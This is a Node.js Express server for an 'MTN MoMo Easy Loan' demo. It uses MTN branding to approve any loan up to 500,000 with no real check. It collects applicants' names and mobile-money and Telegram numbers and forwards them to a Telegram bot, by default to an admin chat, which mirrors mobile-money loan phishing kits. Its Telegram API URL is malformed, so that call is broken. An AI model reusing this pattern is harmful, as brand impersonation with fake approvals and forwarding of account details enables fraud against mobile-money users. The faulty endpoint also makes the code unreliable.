const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Telegram Bot API Credentials (get token from @BotFather on Telegram)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_DEFAULT_CHAT_ID';

/**
 * POST /api/loans/apply
 * Evaluates loan application and dispatches approval feedback via Telegram
 */
app.post('/api/loans/apply', async (req, res) => {
  const {
    fullName,
    mtnMomoNumber,
    telegramPhone,
    telegramChatId,
    loanAmount,
    repaymentMonths,
    monthlyInstallment,
    totalRepayable
  } = req.body;

  // Validate required fields and 10-digit numbers
  if (!fullName || !/^\d{10}$/.test(mtnMomoNumber) || !/^\d{10}$/.test(telegramPhone)) {
    return res.status(400).json({
      status: 'ERROR',
      message: 'Please provide your Full Name and complete 10-digit numbers for both MTN MoMo and Telegram.'
    });
  }

  // Demo Approval Rule: Approves loans up to 500,000
  const numericAmount = Number(loanAmount);
  const isApproved = numericAmount > 0 && numericAmount <= 500000;
  const referenceId = `MOMO-TG-${Date.now().toString().slice(-6)}`;

  const telegramMessage = isApproved
    ? `✅ *MTN MoMo Easy Loan APPROVED*\n\nY'ello *${fullName}*!\n• *MoMo Account:* ${mtnMomoNumber}\n• *Telegram Phone:* ${telegramPhone}\n• *Approved Amount:* ${numericAmount.toLocaleString()}\n• *Tenure:* ${repaymentMonths} Month(s)\n• *Monthly Installment:* ${Number(monthlyInstallment).toLocaleString()}\n• *Total Repayable:* ${Number(totalRepayable).toLocaleString()}\n• *Reference ID:* \`${referenceId}\``
    : `❌ *MTN MoMo Easy Loan DECLINED*\n\nY'ello *${fullName}*, your loan request of *${numericAmount.toLocaleString()}* exceeds the instant demo limit of 500,000.\n• *Reference ID:* \`${referenceId}\``;

  // Use numeric Chat ID if entered, otherwise fall back to DEFAULT_ADMIN_CHAT_ID
  const recipientChatId = (telegramChatId && /^-?\d+$/.test(telegramChatId))
    ? telegramChatId
    : DEFAULT_ADMIN_CHAT_ID;

  let telegramDispatched = false;

  if (TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' && recipientChatId !== 'YOUR_DEFAULT_CHAT_ID') {
    try {
      await axios.post(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: recipientChatId,
        text: telegramMessage,
        parse_mode: 'Markdown'
      });
      telegramDispatched = true;
    } catch (error) {
      console.error('Telegram API Error:', error.response?.data || error.message);
    }
  } else {
    // Offline Demo Mode: Prints the exact Telegram message in your terminal
    console.log('\n=================================================');
    console.log(`[TELEGRAM BOT API DISPATCH -> Phone: ${telegramPhone} | Chat: ${telegramChatId || 'Default'}]`);
    console.log(telegramMessage.replace(/\*/g, ''));
    console.log('=================================================\n');
    telegramDispatched = true;
  }

  // 3-second delay so the approval spinner displays cleanly during your demo
  setTimeout(() => {
    res.json({
      status: isApproved ? 'APPROVED' : 'DECLINED',
      referenceId,
      mtnMomoNumber,
      telegramDispatched,
      message: isApproved
        ? `Y'ello ${fullName}! Your loan of ${numericAmount.toLocaleString()} is APPROVED for MoMo number ${mtnMomoNumber}. Feedback sent to Telegram.`
        : `Y'ello ${fullName}, your loan of ${numericAmount.toLocaleString()} was DECLINED (exceeds 500,000 demo limit).`
    });
  }, 3000);
});

// Serve index.html on all other routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`MTN MoMo Navy & Telegram Demo running at http://localhost:${PORT}`);
});

